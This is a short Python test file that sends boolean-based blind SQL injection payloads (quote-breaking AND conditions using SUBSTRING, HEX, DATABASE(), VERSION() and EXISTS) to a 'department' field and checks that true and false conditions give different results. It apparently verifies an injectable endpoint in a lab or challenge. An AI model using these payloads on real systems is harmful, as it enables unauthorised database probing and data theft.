from conftest import post_check


def test_substring_and_hex_predicates(target_url):
    assert post_check(target_url, department="OPS' AND (SUBSTRING('random-ABC',8,1)='A') -- ")["matched"] is True
    assert post_check(target_url, department="OPS' AND (SUBSTRING('random-ABC',8,1)='B') -- ")["matched"] is False
    assert post_check(target_url, department="OPS' AND (HEX('A')='41') -- ")["matched"] is True
    assert post_check(target_url, department="OPS' AND (HEX('A')='42') -- ")["matched"] is False


def test_database_function_predicates(target_url):
    true_conditions = [
        "DATABASE() IS NOT NULL",
        "LENGTH(DATABASE())>0",
        "VERSION() IS NOT NULL",
        "@@version_comment IS NOT NULL",
        "(SELECT 1)=1",
        "EXISTS(SELECT 1)",
    ]
    false_conditions = [
        "DATABASE() IS NULL",
        "LENGTH(DATABASE())=0",
        "VERSION() IS NULL",
        "@@version_comment IS NULL",
        "(SELECT 1)=2",
        "EXISTS(SELECT 1 WHERE 1=2)",
    ]
    for condition in true_conditions:
        assert post_check(target_url, department=f"OPS' AND ({condition}) -- ")["matched"] is True
    for condition in false_conditions:
        assert post_check(target_url, department=f"OPS' AND ({condition}) -- ")["matched"] is False
